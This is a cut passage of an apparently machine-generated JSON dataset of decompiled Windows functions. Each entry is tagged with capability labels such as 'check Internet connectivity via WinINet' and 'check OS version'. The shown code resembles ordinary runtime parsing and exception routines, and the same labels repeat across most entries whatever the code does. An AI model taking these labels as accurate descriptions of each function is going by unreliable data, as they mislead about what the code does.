        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00402b7b(uint noname_0, int32_t arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t *arg_1ch, \n            int32_t *arg_20h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint arg_8h;\n    uint var_44h;\n    uint *var_40h;\n    int32_t var_3ch;\n    uint32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t *var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uchar var_5h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_30h = arg_10h;\n    var_2ch = arg_20h;\n    if (arg_18h < 10) {\n        iVar4 = 1;\n    }\n    else if (arg_18h < 100) {\n        iVar4 = 2;\n    }\n    else {\n        iVar4 = (999 < arg_18h) + 3;\n    }\n    var_28h = &var_24h;\n    var_34h = iVar4;\n    for (iVar3 = 0; (cVar2 = fcn.00404011(var_30h),  cVar2 == '\\0' && (iVar3 < iVar4)); iVar3 = iVar3 + 1) {\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        if ((*(var_2ch[3] + *(arg_ch + 5) * 2) & 0x48) == 0) break;\n        fcn.00401c7b();\n    }\n    arg_8h = var_30h;\n    cVar2 = fcn.00404011(var_30h);\n    if (cVar2 != '\\0') goto code_r0x00480a9b;\n    if (iVar4 <= iVar3) goto code_r0x00480a9b;\n    if (*(arg_ch + 4) == '\\0') {\n        fcn.004019e7();\n    }\n    var_38h = var_38h & 0xffffff00 | *(arg_ch + 5);\n    pcVar1 = *(*var_2ch + 0x28);\n    (**0x578000)(var_38h, 0);\n    cVar2 = (*pcVar1)();\n    if ((cVar2 != '+') && (cVar2 != '-')) goto code_r0x00480a9b;\n    var_28h = &var_24h + 1;\n    var_24h._0_1_ = cVar2;\n    while( true ) {\n        fcn.00401c7b();\ncode_r0x00480a9b:\n        cVar2 = fcn.00404011(var_30h);\n        if ((cVar2 != '\\0') || (var_34h <= iVar3)) break;\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        var_38h = var_38h & 0xffffff00 | *(arg_ch + 5);\n        pcVar1 = *(*var_2ch + 0x28);\n        (**0x578000)(var_38h, 0);\n        cVar2 = (*pcVar1)();\n        if (cVar2 != '0') break;\n        iVar3 = iVar3 + 1;\n    }\n    puVar5 = var_28h;\n    if (0 < iVar3) {\n        *var_28h = '0';\n        puVar5 = var_28h + 1;\n        var_28h = puVar5;\n    }\n    while (cVar2 = fcn.00404011(var_30h),  cVar2 == '\\0') {\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        var_38h = var_38h & 0xffffff00 | *(arg_ch + 5);\n        pcVar1 = *(*var_2ch + 0x28);\n        (**0x578000)(var_38h, 0);\n        cVar2 = (*pcVar1)();\n        puVar5 = var_28h;\n        if ((9 < cVar2 - 0x30U) || (var_34h <= iVar3)) break;\n        *var_28h = cVar2;\n        if (var_28h < &var_5h) {\n            var_28h = var_28h + 1;\n        }\n        puVar5 = var_28h;\n        iVar3 = iVar3 + 1;\n        fcn.00401c7b();\n    }\n    if (iVar3 == 0) {\n        puVar5 = &var_24h;\n    }\n    *puVar5 = '\\0';\n    var_3ch = 0;\n    iVar4 = fcn.00405682(&var_24h, &var_40h, 10, &var_3ch);\n    fcn.00404011(var_30h);\n    if ((((var_40h != &var_24h) && (var_3ch == 0)) && (arg_14h <= iVar4)) && (iVar4 <= arg_18h)) {\n        *arg_1ch = iVar4;\n    }\n    fcn.004030bc(arg_8h);\n    return;\n}\n",
        "token_count": 1288
    },
    "0048aa09": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048aa09(uint noname_0, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *unaff_EDI;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    \n    *(*(unaff_EBP + 0xc) + -4) = *(unaff_EBP + -0x30);\n    fcn.004066a9(*(unaff_EBP + -0x34));\n    iVar1 = fcn.00402b26();\n    *(iVar1 + 0x10) = *(unaff_EBP + -0x38);\n    iVar1 = fcn.00402b26();\n    *(iVar1 + 0x14) = *(unaff_EBP + -0x3c);\n    if ((((*unaff_EDI == -0x1f928c9d) && (unaff_EDI[4] == 3)) &&\n        ((unaff_EDI[5] == 0x19930520 || ((unaff_EDI[5] == 0x19930521 || (unaff_EDI[5] == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x40) == 0 && (unaff_EBX != 0)))) {\n        iVar1 = fcn.00403044(unaff_EDI[6]);\n        if (iVar1 != 0) {\n            fcn.0040324c(unaff_EDI);\n        }\n    }\n    return;\n}\n",
        "token_count": 375
    },
    "0048ac8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0048ac8c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402b26();\n    if (0 < *(iVar1 + 0x18)) {\n        iVar1 = fcn.00402b26();\n        *(iVar1 + 0x18) = *(iVar1 + 0x18) + -1;\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "00494e83": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00494e83(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        var_20h = &arg_10h;\n        var_8h = arg_10h;\n        var_1ch = &arg_18h;\n        var_18h = &arg_8h;\n        var_ch = arg_10h;\n        var_14h = &arg_14h;\n        var_10h = &arg_1ch;\n        uVar2 = fcn.00494b24(&var_ch, &var_20h);\n        return uVar2;\n    }\n    puVar1 = fcn.00403a35();\n    *puVar1 = 0x16;\n    fcn.004037ce();\n    return 0xffffffff;\n}\n",
        "token_count": 316
    },
    "00494f00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00494f00(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        var_20h = &arg_10h;\n        var_8h = arg_10h;\n        var_1ch = &arg_18h;\n        var_18h = &arg_8h;\n        var_ch = arg_10h;\n        var_14h = &arg_14h;\n        var_10h = &arg_1ch;\n        uVar2 = fcn.00494ab3(&var_ch, &var_20h);\n        return uVar2;\n    }\n    puVar1 = fcn.00403a35();\n    *puVar1 = 0x16;\n    fcn.004037ce();\n    return 0xffffffff;\n}\n",
        "token_count": 316
    },
    "00494f7d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00494f7d(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        var_20h = &arg_10h;\n        var_8h = arg_10h;\n        var_1ch = &arg_18h;\n        var_18h = &arg_8h;\n        var_ch = arg_10h;\n        var_14h = &arg_14h;\n        var_10h = &arg_1ch;\n        uVar2 = fcn.00494c06(&var_ch, &var_20h);\n        return uVar2;\n    }\n    puVar1 = fcn.00403a35();\n    *puVar1 = 0x16;\n    fcn.004037ce();\n    return 0xffffffff;\n}\n",
        "token_count": 317
    },
    "00494ffa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00494ffa(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        var_20h = &arg_10h;\n        var_8h = arg_10h;\n        var_1ch = &arg_18h;\n        var_18h = &arg_8h;\n        var_ch = arg_10h;\n        var_14h = &arg_14h;\n        var_10h = &arg_1ch;\n        uVar2 = fcn.00494ce8(&var_ch, &var_20h);\n        return uVar2;\n    }\n    puVar1 = fcn.00403a35();\n    *puVar1 = 0x16;\n    fcn.004037ce();\n    return 0xffffffff;\n}\n",
        "token_count": 315
    },
    "00495077": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00495077(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        var_20h = &arg_10h;\n        var_8h = arg_10h;\n        var_1ch = &arg_18h;\n        var_18h = &arg_8h;\n        var_ch = arg_10h;\n        var_14h = &arg_14h;\n        var_10h = &arg_1ch;\n        uVar2 = fcn.00494c77(&var_ch, &var_20h);\n        return uVar2;\n    }\n    puVar1 = fcn.00403a35();\n    *puVar1 = 0x16;\n    fcn.004037ce();\n    return 0xffffffff;\n}\n",
        "token_count": 315
    },
    "004950f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.004950f4(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        var_20h = &arg_10h;\n        var_8h = arg_10h;\n        var_1ch = &arg_18h;\n        var_18h = &arg_8h;\n        var_ch = arg_10h;\n        var_14h = &arg_14h;\n        var_10h = &arg_1ch;\n        uVar2 = fcn.00494b95(&var_ch, &var_20h);\n        return uVar2;\n    }\n    puVar1 = fcn.00403a35();\n    *puVar1 = 0x16;\n    fcn.004037ce();\n    return 0xffffffff;\n}\n",
        "token_count": 316
    },
    "0049ae19": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0049ae19(uint *param_1)\n\n{\n    uint arg_8h;\n    uint8_t uVar1;\n    uint arg_10h;\n    int32_t var_474h;\n    uint var_470h;\n    uint var_468h;\n    uint32_t var_464h;\n    uint var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    arg_8h = **param_1;\n    uVar1 = fcn.0040431d(arg_8h);\n    var_464h = var_464h & 0xffffff00 | uVar1;\n    fcn.004058a8(*param_1[1]);\n    var_460h = **param_1;\n    arg_10h = param_1[2][1];\n    fcn.00403fd5(&var_460h, *param_1[2], arg_10h, *param_1[3], &var_470h, *param_1[4]);\n    var_ch = 0;\n    fcn.00403076();\n    fcn.004046f6();\n    if (var_468h != '\\0') {\n        *(var_474h + 0x350) = *(var_474h + 0x350) & 0xfffffffd;\n    }\n    fcn.00405a01(var_464h, arg_8h);\n    fcn.004030bc(arg_10h);\n    return;\n}\n",
        "token_count": 373
    },
    "0049af3e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0049af3e(uint *param_1)\n\n{\n    uint arg_8h;\n    uint8_t uVar1;\n    uint arg_10h;\n    int32_t var_474h;\n    uint var_470h;\n    uint var_468h;\n    uint32_t var_464h;\n    uint var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    arg_8h = **param_1;\n    uVar1 = fcn.0040431d(arg_8h);\n    var_464h = var_464h & 0xffffff00 | uVar1;\n    fcn.004058a8(*param_1[1]);\n    var_460h = **param_1;\n    arg_10h = param_1[2][1];\n    fcn.00403fd5(&var_460h, *param_1[2], arg_10h, *param_1[3], &var_470h, *param_1[4]);\n    var_ch = 0;\n    fcn.00406145();\n    fcn.004046f6();\n    if (var_468h != '\\0') {\n        *(var_474h + 0x350) = *(var_474h + 0x350) & 0xfffffffd;\n    }\n    fcn.00405a01(var_464h, arg_8h);\n    fcn.004030bc(arg_10h);\n    return;\n}\n",
        "token_count": 374
    },
    "0049b042": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0049b042(uint *param_1)\n\n{\n    uint arg_8h;\n    uint8_t uVar1;\n    uint *arg_10h;\n    int32_t var_ae0h;\n    uint var_adch;\n    uint var_ad4h;\n    uint var_ad0h;\n    uint var_acch;\n    uint32_t var_ac8h;\n    uint var_ac4h;\n    uint var_ac0h;\n    uint *var_abch;\n    uint var_ab8h;\n    uint var_ab4h;\n    uint var_a74h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    arg_8h = **param_1;\n    uVar1 = fcn.0040431d(arg_8h);\n    var_ac8h = var_ac8h & 0xffffff00 | uVar1;\n    fcn.004058a8(*param_1[1]);\n    var_ac4h = **param_1;\n    var_ab8h = *param_1[4];\n    var_abch = &var_adch;\n    var_ac0h = *param_1[3];\n    var_ad0h = *param_1[2];\n    var_acch = param_1[2][1];\n    arg_10h = &var_ac0h;\n    fcn.00404098(&var_ac4h, &var_ad0h, arg_10h, &var_abch, &var_ab8h);\n    fcn.00405ddf();\n    fcn.004046f6();\n    if (var_ad4h != '\\0') {\n        *(var_ae0h + 0x350) = *(var_ae0h + 0x350) & 0xfffffffd;\n    }\n    fcn.00405a01(var_ac8h, arg_8h);\n    fcn.004030bc(arg_10h);\n    return;\n}\n",
        "token_count": 447
    },
    "0049b173": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0049b173(uint *param_1)\n\n{\n    uint arg_8h;\n    uint8_t uVar1;\n    uint *arg_10h;\n    int32_t var_ae0h;\n    uint var_adch;\n    uint var_ad4h;\n    uint var_ad0h;\n    uint var_acch;\n    uint32_t var_ac8h;\n    uint var_ac4h;\n    uint var_ac0h;\n    uint *var_abch;\n    uint var_ab8h;\n    uint var_ab4h;\n    uint var_a74h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    arg_8h = **param_1;\n    uVar1 = fcn.0040431d(arg_8h);\n    var_ac8h = var_ac8h & 0xffffff00 | uVar1;\n    fcn.004058a8(*param_1[1]);\n    var_ac4h = **param_1;\n    var_ab8h = *param_1[4];\n    var_abch = &var_adch;\n    var_ac0h = *param_1[3];\n    var_ad0h = *param_1[2];\n    var_acch = param_1[2][1];\n    arg_10h = &var_ac0h;\n    fcn.004068a7(&var_ac4h, &var_ad0h, arg_10h, &var_abch, &var_ab8h);\n    fcn.00404efd();\n    fcn.004046f6();\n    if (var_ad4h != '\\0') {\n        *(var_ae0h + 0x350) = *(var_ae0h + 0x350) & 0xfffffffd;\n    }\n    fcn.00405a01(var_ac8h, arg_8h);\n    fcn.004030bc(arg_10h);\n    return;\n}\n",
        "token_count": 448
    },
    "0049b2af": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0049b2af(uint *param_1)\n\n{\n    uint arg_8h;\n    uint8_t uVar1;\n    uint arg_10h;\n    int32_t var_474h;\n    uint var_470h;\n    uint var_468h;\n    uint32_t var_464h;\n    uint var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    arg_8h = **param_1;\n    uVar1 = fcn.0040431d(arg_8h);\n    var_464h = var_464h & 0xffffff00 | uVar1;\n    fcn.004058a8(*param_1[1]);\n    var_460h = **param_1;\n    arg_10h = param_1[2][1];\n    fcn.00401a1e(&var_460h, *param_1[2], arg_10h, *param_1[3], &var_470h, *param_1[4]);\n    var_ch = 0;\n    fcn.00404773();\n    fcn.004046f6();\n    if (var_468h != '\\0') {\n        *(var_474h + 0x350) = *(var_474h + 0x350) & 0xfffffffd;\n    }\n    fcn.00405a01(var_464h, arg_8h);\n    fcn.004030bc(arg_10h);\n    return;\n}\n",
        "token_count": 375
    },
    "0049b3be": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0049b3be(uint *param_1)\n\n{\n    uint arg_8h;\n    uint8_t uVar1;\n    uint arg_10h;\n    int32_t var_474h;\n    uint var_470h;\n    uint var_468h;\n    uint32_t var_464h;\n    uint var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    arg_8h = **param_1;\n    uVar1 = fcn.0040431d(arg_8h);\n    var_464h = var_464h & 0xffffff00 | uVar1;\n    fcn.004058a8(*param_1[1]);\n    var_460h = **param_1;\n    arg_10h = param_1[2][1];\n    fcn.00401a1e(&var_460h, *param_1[2], arg_10h, *param_1[3], &var_470h, *param_1[4]);\n    var_ch = 0;\n    fcn.0040317f();\n    fcn.004046f6();\n    if (var_468h != '\\0') {\n        *(var_474h + 0x350) = *(var_474h + 0x350) & 0xfffffffd;\n    }\n    fcn.00405a01(var_464h, arg_8h);\n    fcn.004030bc(arg_10h);\n    return;\n}\n",
        "token_count": 376
    },
    "004b43fa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.004b43fa(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    float10 fVar3;\n    uint arg_ch_00;\n    uint arg_10h_00;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_ch;\n    float var_4h;\n    \n    if (arg_ch != NULL) {\n        *arg_ch = arg_8h;\n    }\n    if (arg_8h == 0) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        fVar3 = 0;\n    }\n    else {\n        fcn.004058a8(arg_10h);\n        puVar1 = &var_4h;\n        var_4h = 0.0;\n        arg_ch_00 = extraout_ECX;\n        arg_10h_00 = extraout_ECX;\n        fcn.004051c3(&stack0xffffffcc, arg_8h, arg_ch);\n        iVar2 = fcn.00403850(&var_14h, arg_ch_00, arg_10h_00, puVar1);\n        if ((iVar2 == 3) || (iVar2 == 2)) {\n            puVar1 = fcn.00403a35();\n            *puVar1 = 0x22;\n        }\n        if (var_ch != '\\0') {\n            *(var_18h + 0x350) = *(var_18h + 0x350) & 0xfffffffd;\n        }\n        fVar3 = var_4h;\n    }\n    return fVar3;\n}\n",
        "token_count": 413
    },
    "004b44ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.004b44ac(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    float10 fVar3;\n    uint arg_ch_00;\n    uint arg_10h_00;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_ch;\n    float var_4h;\n    \n    if (arg_ch != NULL) {\n        *arg_ch = arg_8h;\n    }\n    if (arg_8h == 0) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        fVar3 = 0;\n    }\n    else {\n        fcn.004058a8(arg_10h);\n        puVar1 = &var_4h;\n        var_4h = 0.0;\n        arg_ch_00 = extraout_ECX;\n        arg_10h_00 = extraout_ECX;\n        fcn.0040593e(&stack0xffffffcc, arg_8h, arg_ch);\n        iVar2 = fcn.00405f8d(&var_14h, arg_ch_00, arg_10h_00, puVar1);\n        if ((iVar2 == 3) || (iVar2 == 2)) {\n            puVar1 = fcn.00403a35();\n            *puVar1 = 0x22;\n        }\n        if (var_ch != '\\0') {\n            *(var_18h + 0x350) = *(var_18h + 0x350) & 0xfffffffd;\n        }\n        fVar3 = var_4h;\n    }\n    return fVar3;\n}\n",
        "token_count": 415
    },
    "004b455e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.004b455e(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    float10 fVar3;\n    uint arg_ch_00;\n    uint arg_10h_00;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    \n    if (arg_ch != NULL) {\n        *arg_ch = arg_8h;\n    }\n    if (arg_8h == 0) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        fVar3 = 0;\n    }\n    else {\n        fcn.004058a8(arg_10h);\n        puVar1 = &var_ch;\n        _var_ch = 0.0;\n        arg_ch_00 = extraout_ECX;\n        arg_10h_00 = extraout_ECX;\n        fcn.004051c3(&stack0xffffffc8, arg_8h, arg_ch);\n        iVar2 = fcn.004018c5(&var_18h, arg_ch_00, arg_10h_00, puVar1);\n        if ((iVar2 == 3) || (iVar2 == 2)) {\n            puVar1 = fcn.00403a35();\n            *puVar1 = 0x22;\n        }\n        fVar3 = _var_ch;\n        if (var_10h != '\\0') {\n            *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n        }\n    }\n    return fVar3;\n}\n",
        "token_count": 413
    },
    "004b4609": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.004b4609(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    float10 fVar3;\n    uint arg_ch_00;\n    uint arg_10h_00;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    \n    if (arg_ch != NULL) {\n        *arg_ch = arg_8h;\n    }\n    if (arg_8h == 0) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        fVar3 = 0;\n    }\n    else {\n        fcn.004058a8(arg_10h);\n        puVar1 = &var_ch;\n        _var_ch = 0.0;\n        arg_ch_00 = extraout_ECX;\n        arg_10h_00 = extraout_ECX;\n        fcn.0040593e(&stack0xffffffc8, arg_8h, arg_ch);\n        iVar2 = fcn.004015fa(&var_18h, arg_ch_00, arg_10h_00, puVar1);\n        if ((iVar2 